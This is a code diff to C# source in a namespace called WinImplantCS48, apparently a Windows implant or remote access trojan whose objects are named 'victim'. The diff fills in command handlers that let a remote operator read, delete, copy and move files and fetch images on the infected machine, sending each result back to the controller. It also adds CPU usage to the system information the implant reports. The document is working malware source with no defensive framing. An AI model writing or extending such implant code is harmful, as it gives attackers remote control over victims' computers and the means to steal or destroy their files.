@@ -34,7 +34,6 @@ namespace WinImplantCS48
             InitializeComponent();
             
             m_args = args;
-
         }
 
         void fnRecv(clsVictim victim, List<string> lsMsg)
@@ -95,6 +94,7 @@ namespace WinImplantCS48
                     stInfo.m_nUid.ToString(),
                     stInfo.m_bIsRoot ? "1" : "0",
                     stInfo.m_szOSName,
+                    infoSpyder.fndGetCpuUsage().ToString("F2"),
                 };
 
                 victim.fnSendCommand(msg);
@@ -175,7 +175,16 @@ namespace WinImplantCS48
                 }
                 else if (vsMsg[1] == "rf")
                 {
-
+                    string szFilePath = vsMsg[2];
+                    var ret = fileMgr.fnReadFile(szFilePath);
+                    victim.fnSendCommand(new string[]
+                    {
+                        "file",
+                        "rf",
+                        ret.nCode.ToString(),
+                        szFilePath,
+                        ret.szContent,
+                    });
                 }
                 else if (vsMsg[1] == "uf")
                 {
@@ -191,19 +200,58 @@ namespace WinImplantCS48
                 }
                 else if (vsMsg[1] == "del")
                 {
-
+                    string szPath = vsMsg[2];
+                    var ret = fileMgr.fnDelete(szPath);
+                    victim.fnSendCommand(new string[]
+                    {
+                        "file",
+                        "del",
+                        ret.nCode.ToString(),
+                        szPath,
+                        ret.szMsg,
+                    });
                 }
                 else if (vsMsg[1] == "cp")
                 {
-
+                    string szSrcPath = vsMsg[2];
+                    string szDstPath = vsMsg[3];
+                    var ret = fileMgr.fnCopy(szSrcPath, szDstPath);
+                    victim.fnSendCommand(new string[]
+                    {
+                        "file",
+                        "cp",
+                        ret.nCode.ToString(),
+                        szSrcPath,
+                        szDstPath,
+                        ret.szMsg,
+                    });
                 }
                 else if (vsMsg[1] == "mv")
                 {
-
+                    string szSrcPath = vsMsg[2];
+                    string szDstPath = vsMsg[3];
+                    var ret = fileMgr.fnMove(szSrcPath, szDstPath);
+                    victim.fnSendCommand(new string[]
+                    {
+                        "file",
+                        "mv",
+                        ret.nCode.ToString(),
+                        szSrcPath,
+                        szDstPath,
+                        ret.szMsg,
+                    });
                 }
                 else if (vsMsg[1] == "img")
                 {
-
+                    string szFilePath = vsMsg[2];
+                    var ret = fileMgr.fnReadImage(szFilePath);
+                    victim.fnSendCommand(new string[]
+                    {
+                        "file",
+                        "img",
+                        szFilePath,
+                        ret.szMsg,
+                    });
                 }
                 else if (vsMsg[1] == "nd")
                 {
